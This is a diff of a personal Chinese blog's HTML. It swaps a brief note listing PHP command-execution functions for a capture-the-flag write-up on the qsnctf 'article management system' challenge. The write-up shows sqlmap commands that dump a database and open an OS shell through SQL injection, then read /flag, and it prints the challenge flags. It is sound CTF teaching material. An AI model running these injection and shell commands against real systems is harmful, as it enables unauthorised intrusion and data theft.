@@ -6,22 +6,24 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://zhouypeng.github.io">
-  <title>命令执行 | zhou</title>
+  <title>[qsnctf]文章管理系统 | zhou</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="常见函数  system  会回显 system(“ls”)">
+  <meta name="description" content="题目考点：SQL注入、命令执行">
 <meta property="og:type" content="article">
-<meta property="og:title" content="命令执行">
-<meta property="og:url" content="https://zhouypeng.github.io/2024/04/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:title" content="[qsnctf]文章管理系统">
+<meta property="og:url" content="https://zhouypeng.github.io/article/713bb6ad.html">
 <meta property="og:site_name" content="zhou">
-<meta property="og:description" content="常见函数  system  会回显 system(“ls”)">
+<meta property="og:description" content="题目考点：SQL注入、命令执行">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2024-04-02T02:39:30.000Z">
-<meta property="article:modified_time" content="2024-04-05T12:57:52.791Z">
+<meta property="og:image" content="https://zhouypeng.github.io/article/713bb6ad.htm/1.png">
+<meta property="article:published_time" content="2024-04-02T02:16:42.000Z">
+<meta property="article:modified_time" content="2024-04-06T08:11:48.364Z">
 <meta property="article:author" content="zhoupeng">
-<meta property="article:tag" content="命令执行·">
+<meta property="article:tag" content="SQL注入">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://zhouypeng.github.io/article/713bb6ad.htm/1.png">
   
     <link rel="alternative" href="/atom.xml" title="zhou" type="application/atom+xml">
   
@@ -237,14 +239,14 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-命令执行" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-qsnctf文章管理系统" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
   
   
     <h1 class="article-title" itemprop="name">
-      命令执行
+      [qsnctf]文章管理系统
     </h1>
   
 
@@ -256,8 +258,8 @@
               <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
         </span>
 
-<a href="/2024/04/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="archive-article-date">
-        <time datetime="2024-04-02T02:39:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-04-02</time>
+<a href="/article/713bb6ad.html" class="archive-article-date">
+        <time datetime="2024-04-02T02:16:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-04-02</time>
 </a>
 
   
@@ -270,7 +272,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">119字</span>
+      <span class="post-count">311字</span>
     </span>
   </span>
 
@@ -292,45 +294,30 @@
  
 
 	
-		<p>常见函数 </p>
-<p>system</p>
-<ul>
-<li>会回显</li>
-<li>system(“ls”)</li>
-</ul>
+		<p><strong>题目考点：</strong>SQL注入、命令执行</p>
 <span id="more"></span>
 
-<p>exec</p>
-<ul>
-<li>后面不加变量只会回显最后一行，加变量时会把内容放到后面那个变量生成数组</li>
-</ul>
-<p>passthru</p>
-<ul>
-<li>有回显</li>
-</ul>
-<p>shell_exec</p>
-<ul>
-<li>执行指令，但没有回显，需要借助echo等</li>
-</ul>
-<p>反引号</p>
-<ul>
-<li>执行指令，没有回显，跟shell_exec差不多</li>
-</ul>
-<p>popen</p>
-<ul>
-<li><p>两个变量</p>
-</li>
-<li><p>fgets获取内容–&gt;echo输出内容</p>
-</li>
-</ul>
-<p>proc_open</p>
-<p>pcntl_exec</p>
-<p>替换绕过函数过滤</p>
-<ul>
-<li>使用未被限制的函数</li>
-</ul>
-<p>LD_PRELOAD绕过</p>
+<p>不废话，上题目</p>
+<p><img src="/article/713bb6ad.htm/1.png"></p>
+<p>点击下一篇，观察到payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge.qsnctf.com:30280/?id=1</span><br></pre></td></tr></table></figure>
 
+<p>如上?id&#x3D;1，疑似注入点，可能存在注入点，于是使用sqlmap跑一下，发现一个flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap --url=&quot;http://challenge.qsnctf.com:30280/?id=1&quot; -D word -T articles   --dump --batch</span><br><span class="line"></span><br><span class="line">qsnctf&#123;sql+so+easy!!!!&#125;</span><br></pre></td></tr></table></figure>
+
+<p>提交提示错误，且题目说了存在一个假的flag，要我们用命令执行</p>
+<p>sqlmap中的–os-shell原理</p>
+<p>在使用sqlmap进行渗透测试时，–os-shell选项允许用户在目标系统上获取一个交互式shell。这个功能背后的原理是通过sqlmap利用SQL注入漏洞在数据库中注入特定的SQL命令，这些命令可以执行系统命令并将输出返回到sqlmap。</p>
+<ul>
+<li>以下是使用–os-shell时可能的步骤：<ul>
+<li>检测目标是否有注入漏洞。</li>
+<li>利用检测到的漏洞获取数据库访问权限。</li>
+<li>上传一个包含系统命令执行功能的脚本到目标服务器。</li>
+<li>执行脚本以获取交互式shell。</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> sqlmap --url=&quot;http://challenge.qsnctf.com:30280/?id=1&quot; --os-shell </span><br><span class="line"></span><br><span class="line">find / -name &quot;flag&quot;</span><br><span class="line"></span><br><span class="line">发现存在/flag目录</span><br><span class="line"></span><br><span class="line"> cat /flag 获得flag</span><br><span class="line"></span><br><span class="line"> qsnctf&#123;d6abcfbfcc95467a95acec7a9f5b0f03&#125;</span><br></pre></td></tr></table></figure>
 	
 
 
@@ -368,7 +355,7 @@
         </li>
         <li>
           <strong>本文链接：</strong>
-          <a href="https://zhouypeng.github.io/2024/04/02/命令执行/" title="命令执行" target="_blank">https://zhouypeng.github.io/2024/04/02/命令执行/</a>
+          <a href="https://zhouypeng.github.io/article/713bb6ad.html" title="[qsnctf]文章管理系统" target="_blank">https://zhouypeng.github.io/article/713bb6ad.html</a>
         </li>
         
         <li>
@@ -390,7 +377,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">命令执行·</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">SQL注入</a>
         		</li>
       		
 		</ul>
@@ -402,7 +389,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/webbug//" class="article-tag-list-link color2">webbug</a>
+        			<a href="/categories/CTFwp//" class="article-tag-list-link color1">CTFwp</a>
         		</li>
       		
 		</ul>
@@ -457,7 +444,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-     <!-- <img src="//pan.baidu.com/share/qrcode?url=https://zhouypeng.github.io/2024/04/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" alt="微信分享二维码"> -->
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=https://zhouypeng.github.io/article/713bb6ad.html" alt="微信分享二维码"> -->
     </div>
 </div>
 
@@ -472,18 +459,18 @@
 
 <nav id="article-nav">
   
-    <a href="/2024/04/03/python-%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91%E6%95%B0%E5%88%97/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/article/cf64b99a.html" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          Python 斐波那契数列
+          命令执行
         
       </div>
     </a>
   
   
-    <a href="/2024/04/02/qsnctf%E6%96%87%E7%AB%A0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">[qsnctf]文章管理系统</div>
+    <a href="/article/d3333ead.html" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">反序列化</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -524,9 +511,9 @@
     <script src="/lib/gitment.js"></script>
   
   <script>
-    <!-- id: "命令执行" -->
+    <!-- id: "[qsnctf]文章管理系统" -->
     var gitment = new Gitment({
-      id: "20240402103930",
+      id: "20240402101642",
       owner: 'zhouypeng',
       repo: 'zhouypeng.github.io',
       oauth: {
